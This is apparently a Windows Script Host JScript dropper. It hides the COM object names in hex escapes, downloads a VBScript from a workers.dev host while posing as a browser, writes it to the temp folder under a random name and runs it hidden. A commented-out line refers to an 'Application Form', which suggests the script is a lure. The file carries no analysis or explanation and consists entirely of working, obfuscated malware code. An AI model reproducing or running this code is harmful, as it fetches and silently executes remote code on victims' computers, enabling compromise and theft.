(function() {
    // Helper to decode standard hex/unicode escapes without complex XOR math
    function getProgId(type) {
        switch(type) {
            case 'shell': return "\x57\x53\x63\x72\x69\x70\x74\x2e\x53\x68\x65\x6c\x6c";
            case 'http':  return "\x4d\x53\x58\x4d\x4c\x32\x2e\x53\x65\x72\x76\x65\x72\x58\x4d\x4c\x48\x54\x54\x50";
            case 'fso':   return "\x53\x63\x72\x69\x70\x74\x69\x6e\x67\x2e\x46\x69\x6c\x65\x53\x79\x73\x74\x65\x6d\x4f\x62\x6a\x65\x63\x74";
        }
    }

    try {
        var sh = WScript.CreateObject(getProgId('shell'));
        var ht = WScript.CreateObject(getProgId('http'));
        var fs = WScript.CreateObject(getProgId('fso'));

        var target = "\x68\x74\x74\x70\x73\x3a\x2f\x2f" + "tight-field-6c40.r91459773.workers.dev/script.vbs";

        ht.open("GET", target, false);
        ht.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
        ht.send();

        // Print status to console for verification
        // WScript.Echo("HTTP Status: " + ht.status);

        if (ht.status === 200) {
            var dest = sh.ExpandEnvironmentStrings("%TEMP%") + "\\" + Math.random().toString(36).substring(7) + ".vbs";
            var f = fs.CreateTextFile(dest, true, false);
            f.write(ht.responseText);
            f.close();

            sh.Run("cmd.exe /c start /b " + dest, 0, false);
            // WScript.Echo("Opening the Application Form. Please check your browser for the download.");
        } else {
            // WScript.Echo("Server returned non-200 status.");
        }
    } catch (e) {
        // WScript.Echo("Runtime Error: " + e.message);
    }
})();